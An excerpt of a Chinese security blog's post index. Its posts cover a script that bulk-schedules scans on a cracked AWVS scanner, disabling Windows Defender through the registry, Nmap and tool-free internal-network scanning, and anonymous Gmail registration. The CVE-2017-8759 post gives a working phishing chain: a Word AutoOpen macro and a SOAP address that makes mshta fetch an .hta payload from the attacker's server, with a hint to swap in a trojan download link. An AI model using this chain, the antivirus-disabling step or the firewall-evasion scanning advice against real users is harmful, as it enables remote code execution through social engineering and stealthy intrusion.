&#125; data_scan='&#123;"target_id":'+'\"'+target_id+'\"'+',"profile_id":"11111111-1111-1111-1111-111111111111","schedule":&#123;"disable":false,"start_date":null,"time_sensitive":false&#125;,"ui_session_id":"66666666666666666666666666666666"&#125;' req_scan=urllib2.Request(url_scan,headers=headers_scan) response_scan=urllib2.urlopen(req_scan,data_scan) print response_scan.read()+"添加成功！" #以上代码实现批量加入扫描 urllist.close() except Exception,e: print edef count(): url_count="https://localhost:3443/api/v1/notifications/count" req_count=urllib2.Request(url_count,headers=send_headers2) response_count=urllib2.urlopen(req_count) print "当前存在%r个通知！" % json.loads(response_count.read())['count'] print "-" * 50 print "已存在以下任务" url_info="https://localhost:3443/api/v1/scans" req_info=urllib2.Request(url_info,headers=send_headers2) response_info=urllib2.urlopen(req_info) all_info = json.loads(response_info.read()) num = 0 for website in all_info.get("scans"): num+=1 print website.get("target").get("address")+" \r\n target_id:"+website.get("scan_id") print "共 %r个扫描任务" % num #count()#scan、target、notification！def del_scan(): url_info="https://localhost:3443/api/v1/scans" req_info=urllib2.Request(url_info,headers=send_headers2) response_info=urllib2.urlopen(req_info) all_info = json.loads(response_info.read()) counter = 0 for website in all_info.get("scans"): #if (website.get("target").get("description"))== "222": url_scan_del="https://localhost:3443/api/v1/scans/"+str(website.get("scan_id")) req_del = urllib2.Request(url_scan_del,headers=send_headers2) req_del.get_method =lambda: 'DELETE' response_del = urllib2.urlopen(req_del) counter = counter+1 print "已经删除第%r个!" % counter#del_scan() #通过描述判断是否使用扫描器添加扫描器添加的时候设置description=“222”def del_targets(): url_info="https://localhost:3443/api/v1/targets" req_info=urllib2.Request(url_info,headers=send_headers2) response_info=urllib2.urlopen(req_info) all_info = json.loads(response_info.read()) for website in all_info.get("targets"): if (website.get("description"))== "222": url_scan_del="https://localhost:3443/api/v1/targets/"+str(website.get("target_id")) req_del = urllib2.Request(url_scan_del,headers=send_headers2) req_del.get_method =lambda: 'DELETE' response_del = urllib2.urlopen(req_del) print "ok!"#del_targets()if __name__== "__main__": print "*" * 20 count() print "1、使用testawvs.txt添加扫描任务并执行请输入1，然后回车\r\n2、删除所有使用该脚本添加的任务请输入2，然后回车\r\n3、删除所有任务请输入3，然后回车\r\n4、查看已存在任务请输入4，然后回车\r\n" choice = raw_input("&gt;")# print type(choice) if choice =="1": add_exec_scan() count() elif choice =="2": del_targets() count() elif choice =="3": del_scan() count() elif choice =="4": count() else: print "请重新运行并请输入1、2、3、4选择。"#下图的注释信息是删除通知。。""" counter= 0 for website in all_info.get("notifications"): if (website["data"].get("address")== "www.ly.com"): counter = counter + 1 url_del = "https://localhost:3443/api/v1/scans/"+str(website["data"].get("scan_id")) print url_del#print url_del req_del = urllib2.Request(url_del,headers=send_headers2) #DELETE方法 try: req_del.get_method = lambda:"DELETE" response1 = urllib2.urlopen(req_del) except: print "error" continue print counter #print response1.read() #for address in need_info["address"] # if addressdel_all()""" 点我下载awvs集合脚本 参考 awvs 11一键启动-停止脚本 awvs11批量添加扫描\删除小脚本]]></content>
+      <categories>
+        <category>神兵利器</category>
+      </categories>
+      <tags>
+        <tag>acunetix web vulnerability scanner 11</tag>
+        <tag>awvs11破解版版</tag>
+        <tag>awvs11启动停止脚本</tag>
+        <tag>awvs11批量扫描脚本</tag>
+        <tag>漏洞扫描工具</tag>
+        <tag>批处理脚本</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[windows10关闭最新Windows Defender]]></title>
+    <url>%2F2017%2F09%2F18%2Fwindows10-off-new-Windows-Defender%2F</url>
+    <content type="text"><![CDATA[简述Windows Defender，曾用名Microsoft AntiSpyware，是用来移除、隔离和预防间谍软件的程序，可以运行在Windows XP以及更高版本的操作系统上，并已经内置在Windows Vista以及以后的版本中。测试版于2005年1月6日发布，在2005年6月23日、2006年2月17日微软又发布了更新的测试版本。Windows Defender的定义库更新很频繁。在Windows 8中与Microsoft Security Essentials集成。Windows Defender不像某些其他同类免费产品一样只能扫描系统，还可以对系统进行实时监控，移除已经安装的ActiveX插件，清除大多数微软的程序和其他常用程序的历史纪录。 组策略&amp;注册表关闭最新Windows Defender使用组策略关闭最新Windows Defender本地组策略编辑器仅在Windows 10 Pro，Enterprise和Education 版本中可用。 所有版本可以使用下面的注册表。 打开步骤:开始-运行[win+r]-输入gpedit.msc win+r=键盘windows图标+r键 打开右侧菜单栏选择计算机配置-管理模板-Windows 组件-Windows Defender 防病毒程序-关闭 Windows Defender 防病毒程序 默认是未配置,我先前启用了 选择已启用,点击确定,然后关闭组策略 使用注册表关闭最新Windows Defender使用REG文件打开或关闭Windows Defender Antivirus 下面的.reg文件将添加和修改下面的注册表项中的DWORD值。 HKEY_LOCAL_MACHINE \ SOFTWARE \ Policies \ Microsoft \ Windows Defender DisableAntiSpyware DWORD (delete) or 0 = On1 = Off 关闭Windows Defender Antivirus下面代码复制,新建文本文档将内容粘贴进去,保存并重命名为关闭windef.reg1234Windows Registry Editor Version 5.00[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender]"DisableAntiSpyware"=dword:00000001 开启Windows Defender Antivirus下面代码复制,新建文本文档将内容粘贴进去,保存并重命名为开启windef.reg1234Windows Registry Editor Version 5.00[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender]"DisableAntiSpyware"=- 点我下载:关闭和开启脚本 参考 Windows Defender Turn On or Off Windows Defender in Windows 10]]></content>
+      <categories>
+        <category>技术问题解答</category>
+      </categories>
+      <tags>
+        <tag>win10</tag>
+        <tag>删除最新Windows Defender</tag>
+        <tag>关闭最新Windows Defender</tag>
+        <tag>打开windows Defender</tag>
+        <tag>删除杀毒软件</tag>
+        <tag>组策略</tag>
+        <tag>注册表</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Nmap 中文教程]]></title>
+    <url>%2F2017%2F09%2F16%2FNmap-Chinese-Course%2F</url>
+    <content type="text"><![CDATA[0x00 简述Nmap（网络映射器）是一款用于网络发现和安全审计的网络安全工具，它是自由软件。软件名字Nmap是Network Mapper的简称。通常情况下，Nmap用于： 列举网络主机清单 管理服务升级调度 监控主机 服务运行状况 Nmap可以检测目标主机是否在线、端口开放情况、侦测运行的服务类型及版本信息、侦测操作系统与设备类型等信息。 它是网络管理员必用的软件之一，用以评估网络系统安全。Nmap 是不少黑客及脚本小孩爱用的工具 。系统管理员可以利用Nmap来探测工作环境中未经批准使用的服务器，黑客通常会利用Nmap来搜集目标电脑的网络设定，从而计划攻击的方法。Nmap通常用在信息搜集阶段，用于搜集目标机主机的基本状态信息。扫描结果可以作为漏洞扫描、漏洞利用和权限提升阶段的输入。例如，业界流行的漏洞扫描工具Nessus与漏洞利用工具Metasploit都支持导入Nmap的XML格式结果，而Metasploit框架内也集成了Nmap工具（支持Metasploit直接扫描）。Nmap不仅可以用于扫描单个主机，也可以适用于扫描大规模的计算机网络（例如，扫描英特网上数万台计算机，从中找出感兴趣的主机和服务）。 0x01 命令及参数介绍常见端口扫描 map [Scan Type(s)] [Options] {target specification}scan type(s) 用于指定扫描类型options 用于指定选项target specification 用于指定扫描目标 -s 指定扫描类型如下：-sP (ping扫描) 存活主机探测-sS (TCP SYN扫描 隐身扫描) 默认扫描方式-sT (tcp 扫描) syn 不能用时就tcp扫描-sU （UDP 扫描）-sA （ACK扫描） 三次握手 用于探测出防火墙过滤端口 实际渗透中没多大用-sV （版本探测）-A 操作系统探测-O （启用操作系统检测）-v 详细选项说明：-P0 [指定端口] (无ping扫描)-PU [指定端口] (udp ping扫描)-PS [指定端口] (TCP SYN ping 扫描)-PA [指定端口] (tcp ack ping扫描)-PI 使用真正的pingICMP echo请求来扫描目标主机是否正在运行-iL 指定扫描主机列表-iR 随机选择目标–exclude 排除扫描目标–excludefile 排除文件中目标列表-n (不用域名解析)-R (为所有目标解析域名)-T 时间优化（每隔多久发一次包 ） -T5 最快 -T0 最慢-F 快速扫描-e 指定网络接口-M 设置tcp扫描线程 输出 -oS “1337格式” 保存扫描结果输出-oN 把扫描结果重定向到一个可读的文件logfilename中-oM 每个结果一行输出-oA 同上–append-output 附在原来的结果前面 Nmap端口6个状态 open（开放的）closed（关闭的）filtered（被过滤的）不确定开放还是关闭unfiltered （未被过滤的）openfiltered （开放或者被过滤的）closedfiltered （关闭或者未被过滤的） 使用实例获取远程主机的系统类型及开放端口 nmap -sS -P0 -sV -O 获取ip和mac地址： nmap -sP -PI -PT -oN 192.168.1.0/24 扫描存活主机 nmap -sP -n 192.168.10.0/24 | cut -d” “ -f5 | awk “/192/“ windows: 1nmap -sP -n 192.168.10.0/24 | find "192" &gt;tmp_active001&amp;for /f "tokens=1,2,3,4,5" %i in (tmp_active001)do @echo %m 漏洞探测漏洞脚本根据Nmap,GitHub官方项目script文件夹下查看:https://github.com/nmap/nmap/tree/master/scripts nmap -P0 –script=smb-check-vulns –script-args=unsafe=1 -iL ip.txt 扫描常见端口:1nmap -sT -O -P0 -T5 --open -oN result.txt -p80-89,8080-8099,8000-8009,7001-7009,9000-9099,21,443,873,2601,2604,3128,4440,6082,6379,8888,3389,9200,11211,27017,28017,389,8443,4848,8649,995,9440,9871,2222,2082,3311,18100,9956,1433,3306,1900,49705,50030,7778,5432,7080,5900,50070,5000,5560,10000 63.237.172.115/24 21 ftp 主要看是否支持匿名，也可以跑弱口令80 web 常见web漏洞以及是否为一些管理后台443 openssl 心脏滴血以及一些web漏洞测试873 rsync 主要看是否支持匿名，也可以跑弱口令2601,2604 zebra路由，默认密码zebra3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了4440 rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网6379 redis 一般无认证，可直接访问8000-9090 都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上9200 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞11211 memcache 未授权访问27017 mongodb 未授权访问28017 mongodb统计页面 扫描巨大网络 -sn 不扫描端口，只ping主机-PE 通过ICMP echo判定主机是否存活-n 不反向解析IP地址到域名–min-hostgroup 1024 最小分组设置为1024个IP地址，当IP太多时，nmap需要分组，然后串行扫描–min-parallelism 1024 这个参数非常关键，为了充分利用系统和网络资源，我们将探针的数目限定最小为1024-oX nmap_output.xml 将结果以XML格式输出，文件名为nmap_output.xml 扫描结束，解析XML文档即可得到哪些IP地址存活. 附上自己平时用的nmap命令，由于之前发包太大vps被封过一次，所以加了一些限速的参数 1nmap -sT -sV -O -P0 --open -n -oN result.txt -p80-89,8080-8099,8000-8009,7001-7009,9000-9099,21,443,873,2601,2604,3128,4440,6082,6379,8888,3389,9200,11211,27017,28017,389,8443,4848,8649,995,9440,9871,2222,2082,3311,18100,9956,1433,3306,1900,49705,50030,7778,5432,7080,5900,50070,5000,5560,10000 -iL ip.txt 1nmap -sT -sV -p80-89,8080-8099,8000-8009,7001-7009,9000-9099,21,443,873,2601,2604,3128,4440,6082,6379,8888,3389,9200,11211,27017,28017,389,8443,4848,8649,995,9440,9871,2222,2082,3311,18100,9956,1433,3306,1900,49705,50030,7778,5432,7080,5900,50070,5000,5560,10000 --open --max-hostgroup 10 --max-parallelism 10 --max-rtt-timeout 1000ms --host-timeout 800s --max-scan-delay 2000ms -iL ~/Desktop/ip.txt -oN ~/Desktop/result/result.txt WindoWs自带命令端口扫描及powershellbat批量ping获取iP1234567@echo offsetlocal ENABLEDELAYEDEXPANSION@FOR /F "usebackq eol=- skip=1 delims=\" %%j IN (`net view ^| find "命令成功完成" /v ^|find "The command completed successfully." /v`) DO (@FOR /F "usebackq delims=" %%i IN (`@ping -n 1 -4 %%j ^| findstr "Pinging"`) DO (@FOR /F "usebackq tokens=2 delims=[]" %%k IN (`echo %%i`) DO (echo %%k %%j))) 内网无工具扫描一条 cmd 命令解决： for /l %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1 | find /i “ttl”ping 整个 c 段，只输出有响应的主机。 % H” g% Q+ _6 q- P7 t更变态的： 4 o4 g8 X- v9 x&amp; w域机器对应 IP FOR /F “eol=- tokens=1 delims=\ “ %a IN (‘net view’) DO @(echo name: %a, ip: &amp; ping %a -w 1 -n 1 |find /i “ttl” &amp; echo.)把 net view 的结果，挨个 ping 一遍，并输出机器名和 ip 地址。 找主机名 for /l %i in (1,1,255) do @ping -a 10.0.1.%i -w 1 -n 1 | find /i “Pinging”B 段查找 for /l %i in (1,1,255) do @ping -a 10.0.%i.1 -w 1 -n 1 | find /i “Pinging”Win7 for /l %i in (1,1,255) do @ping -a 10.0.1.%i -w 1 -n 1 | find /i “Pinging”for /l %i in (1,1,255) do @ping -a 10.0.%i.1 -w 1 -n 1 | find /i “Pinging”改成 for /l %i in (1,1,255) do @ping -a 10.0.1.%i -w 1 -n 1 | find /i “Ping”for /l %i in (1,1,255) do @ping -a 10.0.%i.1 -w 1 -n 1 | find /i “Ping”就可以兼容 Win7 了。（Win7 ping -a 输出结果关键词为 “Ping”） 另外findstr /i “pinging” 或 findstr /i “ping” 可以换成 findstr “[” 的 可以适合多语言环境 PowerShell_IPv4NetworkScannerSyntax12345.\IPv4NetworkScan.ps1 [-StartIPv4Address] &lt;IPAddress&gt; [-EndIPv4Address] &lt;IPAddress&gt; [[-Tries] &lt;Int32&gt;] [[-Threads] &lt;Int32&gt;] [[-DisableDNSResolving]] [[-EnableMACResolving]] [[-ExtendedInformations]] [[-IncludeInactive]] [&lt;CommonParameters&gt;].\IPv4NetworkScan.ps1 [-IPv4Address] &lt;IPAddress&gt; [-Mask] &lt;String&gt; [[-Tries] &lt;Int32&gt;] [[-Threads] &lt;Int32&gt;] [[-DisableDNSResolving]] [[-EnableMACResolving]] [[-ExtendedInformations]] [[-IncludeInactive]] [&lt;CommonParameters&gt;].\IPv4NetworkScan.ps1 [-IPv4Address] &lt;IPAddress&gt; [-CIDR] &lt;Int32&gt; [[-Tries] &lt;Int32&gt;] [[-Threads] &lt;Int32&gt;] [[-DisableDNSResolving]] [[-EnableMACResolving]] [[-ExtendedInformations]] [[-IncludeInactive]] [&lt;CommonParameters&gt;] Example 112345PS&gt; .\IPv4NetworkScan.ps1 -StartIPv4Address 192.168.178.0 -EndIPv4Address 192.168.178.20IPv4Address Status Hostname----------- ------ --------192.168.178.1 Up fritz.box Example 2123456PS&gt; .\IPv4NetworkScan.ps1 -IPv4Address 192.168.178.0 -Mask 255.255.255.0 -DisableDNSResolvingIPv4Address Status----------- ------192.168.178.1 Up192.168.178.22 Up Example 3123456PS&gt; .\IPv4NetworkScan.ps1 -IPv4Address 192.168.178.0 -CIDR 25 -EnableMACResolvingIPv4Address Status Hostname MAC Vendor----------- ------ -------- --- ------192.168.178.1 Up fritz.box XX-XX-XX-XX-XX-XX AVM Audiovisuelles Marketing und &gt;Computersysteme GmbH192.168.178.22 Up XXXXX-PC.fritz.box XX-XX-XX-XX-XX-XX ASRock Incorporation 下载链接: https://github.com/BornToBeRoot/PowerShell_IPv4NetworkScanner.git 结语建议大家在内网渗透中尽量使用内网无工具或PowerShell进行端口探测与扫描,防止防火墙报警、拦截 参考文章 nmap语法 内网渗透测试定位技术总结]]></content>
+      <categories>
+        <category>渗透教程</category>
+      </categories>
+      <tags>
+        <tag>渗透教程</tag>
+        <tag>nmap中文教程</tag>
+        <tag>端口扫描</tag>
+        <tag>漏洞扫描</tag>
+        <tag>内网渗透</tag>
+        <tag>漏洞利用</tag>
+        <tag>防火墙</tag>
+        <tag>powershell端口扫描</tag>
+        <tag>bat端口扫描</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[CVE-2017-8759-微软.net远程代码执行漏洞复现]]></title>
+    <url>%2F2017%2F09%2F14%2FCVE-2017-8759-Exploit%2F</url>
+    <content type="text"><![CDATA[基本信息漏洞名称：.NET Framework远程代码执行漏洞漏洞编号：CVE-2017-8759漏洞影响：.NET系列产品的远程代码执行（RCE）并进一步控制系统利用场景：远程钓鱼、社会工程（打开有惊喜哟）影响版本：以下.NET版本 Microsoft .NET Framework 4.6.2 Microsoft .NET Framework 4.6.1 Microsoft .NET Framework 3.5.1 Microsoft .NET Framework 4.7 Microsoft .NET Framework 4.6 Microsoft .NET Framework 4.5.2 Microsoft .NET Framework 3.5 Microsoft .NET Framework 2.0 SP2影响产品：Office(word excel)Edge IE WinOS Skype Lync Sharepoint加固方法：软件类漏洞，微软补丁会悄悄地告诉你https://portal.msrc.microsoft.com/en-us/security-guidance 利用过程简述 本次测试环境:Windows 2007 x64、Kali Linux X64、Python、Office Word 2016 X64 本次测试攻击利用Word宏,其他方法暂未测试. 从GitHub下载文件git clone https://github.com/Voulnet/CVE-2017-8759-Exploit-sample.git 修改文件夹exploit.txt内容&lt;soap:address location=&quot;http://127.0.0.1:8080?C:\Windows\System32\mshta.exe?http://127.0.0.1:8080/cmd.hta&quot;/&gt; soap标签内的ip地址替换成你的Web服务器地址 修改cmd.hta内容本次不做修改,仅做测试[替换标注内容为木马下载链接或其他姿势进行远程攻击] 启动Http服务器python -m SimpleHTTPServer 8080 新建word文档 可以利用从GitHub下载的word直接修改宏,在这里我给大家直接新建演示一次. 新建一个格式为doc的文档,内容自定义主要目的是利用社工诱导用户打开文档及相信该文档是正常文档未涉及钓鱼攻击. 新建宏步骤:视图-宏-宏名”AutoOpen”-创建,输入代码为: Sub AutoOpen() Set x = GetObject(&quot;soap:wsdl=http://127.0.0.1:8080/exploit.txt&quot;) End Sub 同样上面的IP替换你的Http服务器地址 Ctrl+s保存一下,然后点右上角的word图标返回到word界面. 运行结果由于我先前测试时启用了宏,所以没有提示,首次运行会提示需要启用宏.打开文档会生成三个文件在当前路径下. 参考文章 微软.NET远程代码执行漏洞0day分析(社工钓鱼) CVE-2017-8759-Weaponisation Tutorial CVE2017-8759 - RTF WSDL SOAP Parser Vulnerability 1-day]]></content>
+      <categories>
+        <category>漏洞利用</category>
+      </categories>
+      <tags>
+        <tag>漏洞利用</tag>
+        <tag>exploit</tag>
+        <tag>cve-2017-8759</tag>
+        <tag>微软漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[匿名注册谷歌邮箱[实测可用]]]></title>
+    <url>%2F2017%2F09%2F13%2Fanonymous-register-gmail%2F</url>
+    <content type="text"><![CDATA[不需要邮箱验证，不需要手机验证 注册步骤: 从 www.gmail.com 入口，点击注册。 姓氏要手打。（No老师说的） 电话区域的区号选择 特克斯和凯科斯群岛 (Turks &amp; Caicos Islands) 邮件区域不用填写 地区选择 特里斯坦-达库尼亚群岛 (Tristan da Cunha) 测试结果:需使用香港未注册gmail账户的Ss&amp;Vpn,才能注册成功,不建议批量注册及频繁注册 参考文章 匿名注注册Google邮箱]]></content>
+      <categories>
+        <category>福利</category>
+      </categories>
+      <tags>
+        <tag>匿名注册谷歌邮箱</tag>
+        <tag>香港Vpn</tag>
+        <tag>Gmail</tag>
+      </tags>
+  </entry>
 </search>
